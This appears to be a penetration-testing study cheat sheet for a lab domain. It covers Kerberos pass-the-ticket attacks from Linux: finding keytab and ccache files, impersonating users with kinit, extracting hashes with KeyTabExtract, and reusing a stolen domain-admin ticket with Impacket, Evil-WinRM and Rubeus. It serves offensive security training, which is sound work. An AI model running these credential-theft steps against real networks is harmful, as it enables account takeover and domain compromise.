Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory.
By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys. You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

**Note:** Keytab files can be created on one computer and copied for use on other computers.

## Identifying Linux and Active Directory integration
#### realm - Check if Linux machine is domain-joined
```shell
realm list
```
**Note**: In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). 
We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details.
#### PS - Check if Linux machine is domain-joined
```shell
ps -ef | grep -i "winbind\|sssd"
```

---
## Finding Kerberos tickets in Linux

#### Finding KeyTab files
```shell
find / -name *keytab* -ls 2>/dev/null
```
**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.
#### Identifying KeyTab files in Cronjobs
```shell
crontab -l
```

Found this cronjob:
```bash
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```
**Kinit**:  [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.


#### Reviewing environment variables for ccache files.
```shell
env | grep -i krb5
```

#### Searching for ccache files in /tmp
```shell
ls -la /tmp
```

---
## Abusing KeyTab files (Impersonation)

The first thing we can do is impersonate a user using `kinit`.
`klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file.
#### Listing KeyTab file information
```shell
klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- -----------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

#### Impersonating a user with a KeyTab
Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.
```shell
klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
```

Impersonate:
```shell
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

Confirm:
```shell
klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```
#### Connecting to SMB Share as Carlos
```shell
smbclient //dc01/carlos -k 
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

---
## Abusing KeyTab files (Extraction)
If we want to gain access to his account on the Linux machine, we'll need his password.
Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract).
#### Extracting KeyTab hashes with KeyTabExtract\

```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

#### Log in as Carlos
Login with retrieved/cracked password from keytab file:
```shell
su - carlos@inlanefreight.htb
```

---
## Abusing KeyTab ccache
To abuse a ccache file, all we need is read privileges on the file.
#### Looking for ccache files
```shell
ls -la /tmp
```
#### Identifying group membership with the id command
```shell
id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```
Domain Admin Group !
#### Importing the ccache file into our current session
To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```shell
> cp /tmp/krb5cc_647401106_I8I133 .
> export KRB5CCNAME=/root/krb5cc_647401106_I8I133
> klist

Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
        

> smbclient //dc01/C$ -k -no-pass
```
**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.

---
## Using Linux attack tools with Kerberos
**IMPORTANT**: If we manage to retrieve ccache file from a user and want to impersonate from our attack host, we can just tranfer the ccache file to our attack host.
#### Setting the KRB5CCNAME environment variable
```shell
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
#### Impacket
To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.
```shell
wmiexec.py dc01 -k
psexec.py dc01 -k
```
**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

#### Evil-WinRM
#### Kerberos configuration file for INLANEFREIGHT.HTB
Create krb5.conf file:
```shell
netexec smb ip -u user -p password --generate-krb5-file /etc/krb5.conf
export KRB5_CONFIG=/etc/krb5.conf
```

```shell
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

...SNIP...

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...SNIP...
```

```shell
evil-winrm -i dc01 -r inlanefreight.htb
```

---
## Miscellaneous
If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.
#### Impacket Ticket converter
```shell
ticketConverter.py krb5cc_647401106_I8I133 julio.kirbi
```
#### Importing converted ticket into Windows session with Rubeus
```cmd
> Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        
> dir \\dc01\julio
```

## Linikatz (Needs root access)
[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory.
